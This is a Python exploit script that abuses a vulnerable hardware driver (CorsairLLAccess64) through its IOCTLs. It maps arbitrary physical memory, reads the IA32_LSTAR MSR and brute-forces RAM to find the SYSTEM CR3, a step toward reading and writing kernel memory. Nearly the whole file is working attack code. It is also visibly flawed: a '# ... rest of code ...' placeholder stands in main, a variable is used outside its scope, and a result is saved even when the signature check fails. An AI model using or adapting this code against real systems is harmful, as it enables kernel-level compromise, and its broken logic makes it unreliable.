
import ctypes
import struct
import winreg
import subprocess
import os

IOCTL_MAP_PHYS_MEM = 0x00225374
IOCTL_READ_MSR = 0x00225388
IA32_LSTAR = 0xC0000082
PAGE_SIZE = 0x1000
PTE_PHYS_MASK = 0x000FFFFFFFFFF000

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
ntdll = ctypes.WinDLL("ntdll", use_last_error=True)

_MAP_CACHE = {}

def map_page(h, pa):
    pa &= ~0xFFF
    if pa in _MAP_CACHE: return _MAP_CACHE[pa]
    inp = struct.pack("<QII", pa, PAGE_SIZE, 0)
    out = ctypes.c_uint64(0)
    ret = ctypes.c_uint32(0)
    ok = kernel32.DeviceIoControl(h, IOCTL_MAP_PHYS_MEM, inp, 16, ctypes.byref(out), 8, ctypes.byref(ret), None)
    if not ok or not out.value: return None
    _MAP_CACHE[pa] = out.value
    return out.value

def read8(h, pa):
    v = map_page(h, pa & ~0xFFF)
    if not v: return None
    try:
        return struct.unpack("<Q", bytes((ctypes.c_ubyte * 8).from_address(v + (pa & 0xFFF))))[0]
    except:
        return None

def kva_to_pa(h, kva, cr3):
    idxs = [(kva >> 39) & 0x1FF, (kva >> 30) & 0x1FF, (kva >> 21) & 0x1FF, (kva >> 12) & 0x1FF]
    
    e = read8(h, (cr3 & PTE_PHYS_MASK) + idxs[0] * 8)
    if e is None or not (e & 1): return None
    
    e = read8(h, (e & PTE_PHYS_MASK) + idxs[1] * 8)
    if e is None or not (e & 1): return None
    if e & 0x80: return (e & 0x000FFFFFC0000000) + (kva & 0x3FFFFFFF)
    
    e = read8(h, (e & PTE_PHYS_MASK) + idxs[2] * 8)
    if e is None or not (e & 1): return None
    if e & 0x80: return (e & 0x000FFFFFFFE00000) + (kva & 0x1FFFFF)
    
    e = read8(h, (e & PTE_PHYS_MASK) + idxs[3] * 8)
    if e is None or not (e & 1): return None
    return (e & PTE_PHYS_MASK) + (kva & 0xFFF)

def get_lstar(h):
    inn = ctypes.c_uint64(IA32_LSTAR)
    out = ctypes.c_uint64(0)
    ret = ctypes.c_uint32(0)
    kernel32.DeviceIoControl(h, IOCTL_READ_MSR, ctypes.byref(inn), 8, ctypes.byref(out), 8, ctypes.byref(ret), None)
    return out.value

def main():
    try:
        with open(r"C:\Users\justin hernando\Documents\VulnDriver\tools\brute_log.txt", "w") as f:
            f.write("Started\n")
        
        h = kernel32.CreateFileW(r"\\.\CorsairLLAccess64", 0xC0000000, 7, None, 3, 0x80, None)
        if h == -1 or h == 0xFFFFFFFFFFFFFFFF:
            err = ctypes.get_last_error()
            with open(r"C:\Users\justin hernando\Documents\VulnDriver\tools\brute_log.txt", "a") as f:
                f.write(f"Driver Error {err}\n")
            return
        
        lstar = get_lstar(h)
        # ... rest of code ...
    except Exception as e:
        with open(r"C:\Users\justin hernando\Documents\VulnDriver\tools\brute_log.txt", "a") as f:
            f.write(f"Exception: {e}\n")
    print(f"[*] IA32_LSTAR: 0x{lstar:X}")
    
    # Get ntoskrnl base to find signature
    import sys
    sys.path.append(r"C:\Users\justin hernando\Documents\VulnDriver")
    from driver_interact import get_ntoskrnl_base, load_lstar_signature
    ntos = get_ntoskrnl_base()
    sig = load_lstar_signature(ntos, lstar, 16)
    if not sig:
        print("[-] Could not load LSTAR signature")
        return
    
    print(f"[*] Scanning for CR3 (Brute force RAM ranges)...")
    ram_ranges = [(4096, 651264), (1048576, 3722059776), (3724238848, 11759616), (3739217920, 3268608), (3742511104, 307200)]
    
    for start, length in ram_ranges:
        print(f"    Scanning range 0x{start:X} - 0x{start+length:X}")
        # Log range start to a file to track progress
        with open(r"C:\Users\justin hernando\Documents\VulnDriver\tools\brute_progress.txt", "a") as f:
            f.write(f"Range 0x{start:X} - 0x{start+length:X}\n")
        
        for pa in range(start, start + length, 0x1000):
            # If we match the first 16MB scan, skip
            if pa < 0x1000000: continue
            
            # Quick heuristic: PML4 for kernel must have entries in 256-511 range.
            # Check index 496 (ntos index)
            pml4e = read8(h, pa + 496 * 8)
            if pml4e is None or not (pml4e & 1): continue
            
            # Candidate found. Try full translate.
            res_pa = kva_to_pa(h, lstar, pa)
            if res_pa:
                # Check content
                v = map_page(h, res_pa & ~0xFFF)
                if v:
                    data = bytes((ctypes.c_ubyte * 16).from_address(v + (res_pa & 0xFFF)))
                    if data == sig:
                        print(f"\n[+] FOUND SYSTEM CR3: 0x{pa:X}")
                        print(f"[+] LSTAR translated to PA 0x{res_pa:X} with correct signature.")
                    # Save it
                    with open(r"C:\Users\justin hernando\Documents\VulnDriver\tools\system_cr3.txt", "w") as f:
                        f.write(f"0x{pa:X}\n")
                    # Log success to a file we can read from the shell
                    with open(r"C:\Users\justin hernando\Documents\VulnDriver\tools\brute_success.txt", "w") as f:
                        f.write(f"FOUND 0x{pa:X}\n")
                    import time
                    time.sleep(5)
                    return
            
            if pa % 0x1000000 == 0:
                print(f"    ... 0x{pa:X}", end="\r")
            
    print("\n[-] Not found in RAM ranges.")

if __name__ == "__main__":
    main()
